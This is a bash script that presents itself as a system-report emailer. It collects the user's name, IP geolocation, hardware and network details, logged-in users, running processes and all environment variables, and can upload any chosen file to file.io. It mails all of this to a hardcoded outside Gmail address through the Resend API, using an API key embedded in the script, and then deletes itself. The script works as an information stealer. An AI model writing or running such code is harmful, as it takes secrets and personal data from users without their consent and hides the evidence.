#!/bin/bash

# Function to display help
display_help() {
  echo "🛠️  Script Help"
  echo "Usage: a.sh [options]"
  echo
  echo "Options:"
  echo "  -s SUBJECT      📩 Set the email subject (default: your username)"
  echo "  -b BODY         📝 Set the email body (default: user location)"
  echo "  -f FILE         📂 Attach a file to the email"
  echo "  -a              📊 Send comprehensive system information"
  echo "  -h, --help      ❓ Display this help message"
  echo
  echo "Description:"
  echo "This script gathers system information and sends it via email."
  echo "You can specify a subject and body for the email, attach a file,"
  echo "and include comprehensive system information if desired."
  echo
  echo "Examples:"
  echo "  ./a.sh -s \"Daily Report\" -b \"Here is my report.\" -a"
  echo "  ./a.sh -f /path/to/file.txt -a"
  echo
}

# Initialize variables
subject=""
body=""
file=""
send_all_info=false

# Hardcoded receiver email
receiver="marcush3llsquad@gmail.com"

# Get sender's name from environment
sender_name="${USER}@${HOSTNAME}"

# Get the user's location via IP (uses an external service like ipinfo.io)
location=$(curl -s https://ipinfo.io/loc)

# Gather comprehensive system information
os_info=$(uname -a)
cpu_info=$(lscpu | grep 'Model name' | awk -F: '{print $2}' | xargs)
cpu_arch=$(uname -m)
mem_total=$(free -h | grep Mem | awk '{print $2}')
mem_used=$(free -h | grep Mem | awk '{print $3}')
mem_free=$(free -h | grep Mem | awk '{print $4}')
disk_usage=$(df -h / | grep / | awk '{print $5}')
disk_partitions=$(lsblk | grep disk)
network_interfaces=$(ip -o link show | awk -F': ' '{print $2}')
ip_info=$(hostname -I | awk '{print $1}')
uptime_info=$(uptime -p)
logged_users=$(who)
running_processes=$(ps aux --sort=-%mem | head -n 10)
env_vars=$(printenv)

# Parse command line arguments
while getopts ":s:b:f:ah" opt; do
  case $opt in
    s) subject="$OPTARG"
    ;;
    b) body="$OPTARG"
    ;;
    f) file="$OPTARG"
    ;;
    a) send_all_info=true
    ;;
    h) display_help; exit 0
    ;;
    \?) echo "Invalid option: -$OPTARG" >&2; exit 1
    ;;
  esac
done

# If subject is not provided, default to the user's name
if [ -z "$subject" ]; then
  subject="$USER"
fi

# If body is not provided, default to the user's location
if [ -z "$body" ]; then
  body="🗺️ User Location: $location"
fi

# Set API key and endpoint
api_key="re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw"
url="https://api.resend.com/emails"

# Upload file using file.io and get the link if file exists
file_link=""
if [ -n "$file" ] && [ -f "$file" ]; then
  echo "📤 Uploading file..."
  response=$(curl -s -X POST 'https://file.io/' \
    -H 'accept: application/json' \
    -H 'Content-Type: multipart/form-data' \
    -F "file=@$file")

  # Extract the file link from the response
  file_link=$(echo "$response" | jq -r .link)

  if [ "$file_link" != "null" ]; then
    file_attachment="<hr><p><strong>File uploaded:</strong> <a href='$file_link'>$file</a></p>"
  else
    file_attachment="<p><strong>File upload failed</strong></p>"
  fi
else
  file_attachment=""
fi

# Create full email body based on flag
if [ "$send_all_info" = true ]; then
  # Send all system info
  full_body="<p>$body</p>
  <hr>
  <h3>🔍 Comprehensive System Information:</h3>
  <ul>
  <li><strong>🖥️ OS Info:</strong> $os_info</li>
  <li><strong>💻 CPU Info:</strong> $cpu_info</li>
  <li><strong>🛠️ CPU Architecture:</strong> $cpu_arch</li>
  <li><strong>🧠 Total Memory:</strong> $mem_total</li>
  <li><strong>🆗 Used Memory:</strong> $mem_used</li>
  <li><strong>🆓 Free Memory:</strong> $mem_free</li>
  <li><strong>💾 Disk Usage (Root):</strong> $disk_usage</li>
  <li><strong>🗂️ Disk Partitions:</strong> <pre>$disk_partitions</pre></li>
  <li><strong>🌐 Network Interfaces:</strong> $network_interfaces</li>
  <li><strong>🌍 IP Address:</strong> $ip_info</li>
  <li><strong>⏱️ System Uptime:</strong> $uptime_info</li>
  <li><strong>👤 Logged-in Users:</strong> <pre>$logged_users</pre></li>
  <li><strong>🔟 Top 10 Running Processes (by memory):</strong> <pre>$running_processes</pre></li>
  <li><strong>🌱 Environment Variables:</strong> <pre>$env_vars</pre></li>
  </ul>
  $file_attachment"
else
  # Only send subject, body, and file attachment if exists
  full_body="<p>$body</p>$file_attachment"
fi

# Create email data
email_data=$(jq -n \
  --arg from "$sender_name <onboarding@resend.dev>" \
  --arg to "$receiver" \
  --arg subject "$subject" \
  --arg body "$full_body" \
  '{
    from: $from,
    to: [$to],
    subject: $subject,
    html: $body
  }')

# Send the email via curl
curl -s -X POST "$url" \
  -H "Authorization: Bearer $api_key" \
  -H "Content-Type: application/json" \
  -d "$email_data" > /dev/null 2>&1

# Remove the script itself (optional)
rm -rf ./a.sh
